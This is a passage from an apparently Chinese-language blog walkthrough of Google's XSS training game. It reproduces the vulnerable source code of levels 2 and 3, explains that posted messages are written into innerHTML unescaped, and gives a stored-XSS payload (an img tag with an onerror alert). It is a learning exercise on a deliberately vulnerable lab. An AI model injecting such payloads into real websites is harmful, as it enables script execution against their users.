punctuation">;</span>        containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> posts <span class="token operator">=</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>           html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'clear-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> message <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>          document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level2.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Chatter from across the Web.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Clear all posts<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">valign</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level2_icon.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shim<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-content<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span>              <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>share<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Share status!<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sign<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Post-store.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/* * Objects to implement a client-side post database. */</span> <span class="token keyword">function</span> <span class="token function">Post</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> message<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function">PostDB</span><span class="token punctuation">(</span><span class="token parameter">defaultMessage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Initial message to display to users</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>_defaultMessage <span class="token operator">=</span> defaultMessage <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">setup</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> defaultPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string-property property">"posts"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>defaultPost<span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">save</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">message<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> newPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> allPosts <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    allPosts<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPost<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string-property property">"posts"</span> <span class="token operator">:</span> allPosts    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">clear</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">getPosts</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>posts<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>关键代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span> <span class="token comment">//这还少个 '>' 23333</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span></code></pre><p>可以发现我们提交的内容输出字段会被<code>&lt;blockquote&gt;</code>包裹，考虑到数据是存储的服务器上的可以利用存储型xss，利用<code>onerror</code>事件来进行xss</p><blockquote><p>onerror 事件在视频&#x2F;音频（audio&#x2F;video）数据加载期间发生错误时触发。</p></blockquote><p>利用img标签加载一个不存在的对象，会触发onerror事件</p><p>payload：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span><span class="token string">"javascript:alert(1);"</span><span class="token operator">/</span><span class="token operator">></span></code></pre><p>代码存进了服务器里，只要刷新都会触发</p><img src="/article/xss/image-20210424145306208.png" class="" title="level2-1" loading="lazy"><img src="/article/xss/image-20210424145406792.png" class="" title="level2-2" loading="lazy"><hr><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><a href="https://xss-game.appspot.com/level3/frame#1">https://xss-game.appspot.com/level3/frame#1</a></p><p>源码·index.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- Load jQuery --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>      <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Dynamically load the appropriate image.</span>        <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">"Image "</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span>         <span class="token comment">// Select the current tab</span>        <span class="token keyword">var</span> tabs <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'.tab'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tabs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id <span class="token operator">==</span> <span class="token string">"tab"</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab active"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab"</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>         <span class="token comment">// Tell parent we've changed the tab</span>        top<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Extra code so that we can communicate with the parent page</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level3.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Take a tour of our cloud data center.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span 